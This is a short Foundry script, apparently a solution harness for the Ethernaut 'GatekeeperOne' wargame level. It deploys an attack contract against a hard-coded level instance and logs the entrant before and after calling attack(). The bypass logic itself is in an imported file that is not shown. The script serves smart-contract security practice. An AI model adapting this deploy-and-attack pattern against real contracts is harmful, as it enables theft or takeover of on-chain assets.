// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/levels/GatekeeperOne.sol";
import {GatekeeperOneAttack} from "../src/attacks/GatekeeperOneAttack.sol";

contract GatekeeperOneScript is Script {
    GatekeeperOne instance = GatekeeperOne(payable(0x6AAa26E6279c7873D9E59eba1fc29c7072B690B2));
    GatekeeperOneAttack attacker;

    function run() external {
	vm.startBroadcast();
	attacker = new GatekeeperOneAttack();
	console.log("GatekeeperOneAttack Contract deployed to:", address(attacker));
	console.log("GatekeeperOne Contract initial entrant:", instance.entrant());
	console.log("Attacking...");
	attacker.attack(address(instance));
	console.log("GatekeeperOne Contract new entrant:", instance.entrant());
	vm.stopBroadcast();
    }
}
